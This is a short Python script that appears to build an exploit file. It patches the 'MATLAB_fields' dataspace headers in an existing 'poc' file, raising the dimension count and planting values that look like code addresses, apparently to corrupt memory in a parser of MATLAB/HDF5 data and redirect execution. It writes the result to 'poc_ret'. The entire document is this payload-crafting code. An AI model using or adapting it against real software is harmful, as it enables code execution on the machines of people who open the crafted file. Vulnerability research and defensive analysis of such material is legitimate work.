import struct
import sys
from pathlib import Path

source = Path("poc").read_bytes()
data = bytearray(source)

dims = [0, 1, 1, 1, 1, 1, 1, 1, 0x0000000000808F10,
        0x0000000000B278D9, 0x000000000044E140, 0x0000000000407440]

selected = None if len(sys.argv) < 2 else int(sys.argv[1])
position = 0
index = 0
while True:
    position = data.find(b"MATLAB_fields", position)
    if position < 0:
        break
    if selected is None or index == selected:
        dataspace = position + 0x20
        assert data[dataspace] == 1
        data[dataspace + 1] = len(dims)
        struct.pack_into("<H", data, position - 0x10 + 0x0e, 0x68)
        for dimension_index, value in enumerate(dims):
            offset = dataspace + 8 + dimension_index * 8
            data[offset:offset + 8] = struct.pack("<Q", value)
    position += 1
    index += 1

assert len(data) == len(source) == 68176
Path(sys.argv[2] if len(sys.argv) > 2 else "poc_ret").write_bytes(bytes(data))
print(len(data))
